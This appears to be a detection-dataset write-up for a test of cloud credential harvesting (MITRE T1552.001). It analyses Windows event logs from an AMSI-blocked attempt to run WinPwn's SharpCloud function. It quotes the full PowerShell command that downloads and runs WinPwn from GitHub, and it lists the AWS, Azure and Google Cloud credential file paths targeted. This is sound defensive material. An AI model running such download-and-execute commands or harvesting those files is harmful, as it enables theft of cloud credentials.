# T1552.001-12: Credentials In Files — AWS, Azure, Google Cloud

## Technique Context

Credentials in Files (T1552.001) includes harvesting cloud provider credentials stored locally on Windows systems. The WinPwn `SharpCloud` function targets credential files for AWS (`~\.aws\credentials`), Microsoft Azure (`~\.azure\`, `~\.azure\accessTokens.json`, `~\.azure\azureProfile.json`), and Google Cloud (`~\AppData\Roaming\gcloud\`). These files are created by the AWS CLI, Azure CLI, and Google Cloud SDK respectively and may contain access tokens, service account keys, and other long-lived credentials. Cloud credential theft has become increasingly important as organizations adopt hybrid environments.

## What This Dataset Contains

The attack command is captured in PowerShell 4104, Security 4688, and Sysmon EID 1:

> `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')` followed by `SharpCloud -consoleoutput -noninteractive`

This is the same WinPwn-via-IEX pattern as T1552.001-10 and T1552.001-11. AMSI blocks the download identically:

> `This script contains malicious content and has been blocked by your antivirus software.`

The module log (EID 4103) confirms `New-Object net.webclient` executed. Notably, this test does not include a Sysmon EID 22 DNS query event — either the DNS resolution was cached from a prior test (T1552.001-10 and T1552.001-11 ran earlier in the same session and resolved the same hostname), or it occurred outside the capture window. The Security log contains only 5 events (2 EID 4688, 3 EID 4689) with no EID 4703 — a lighter footprint than the other WinPwn tests.

The 43 Sysmon events consist of 34 EID 7 image loads, 4 EID 17 named pipe creates, 2 EID 10 process access, 2 EID 1 process creates, and 1 EID 11 file create. The single EID 11 (compared to 3-5 in other tests) and absence of a DNS query suggest this instance reached AMSI faster or the runtime state was warmer.

## What This Dataset Does Not Contain (and Why)

The `SharpCloud` function — which would enumerate AWS, Azure, and GCP credential directories and files — never executed. AMSI blocked the WinPwn script before it was parsed. There are no file access events for `.aws\credentials`, `.azure\accessTokens.json`, or GCP credential files. No cloud credential content was exposed. The absence of a Sysmon DNS event reflects caching from the same session, not a different attack path.

## Assessment

This dataset is the third WinPwn variant blocked by AMSI at the same execution stage. Its distinguishing characteristic is the `SharpCloud` function name, which explicitly targets multi-cloud credential stores — a particularly high-value objective for attackers in hybrid environments. The telemetry pattern is essentially identical to T1552.001-10 and T1552.001-11: script block with IEX download, AMSI block, module log confirming webclient execution. The lighter Sysmon footprint (no DNS event, fewer file creates) is a normal within-session variation.

## Detection Opportunities Present in This Data

- **PowerShell 4104 script block**: `SharpCloud` combined with the WinPwn URL is a specific indicator. `SharpCloud` is the C#-based cloud credential harvester wrapped in WinPwn.
- **PowerShell 4100 AMSI block**: Present and identical to the other WinPwn tests. Detection rules covering `ScriptContainedMaliciousContent` will fire here.
- **Security 4688 / Sysmon EID 1 command line**: The complete `iex(new-object net.webclient).downloadstring(...)` invocation is recorded.
- **WinPwn URL with pinned commit**: The same URL and commit hash (`121dcee26a7aca368821563cbe92b2b5638c5773`) appears across all WinPwn tests; a single IOC covers all three variants.
- **`net.webclient` + IEX pattern** (EID 4103): The `New-Object net.webclient` module log entry, when followed by an AMSI block error, is a reliable execution-layer indicator regardless of which WinPwn function is invoked.
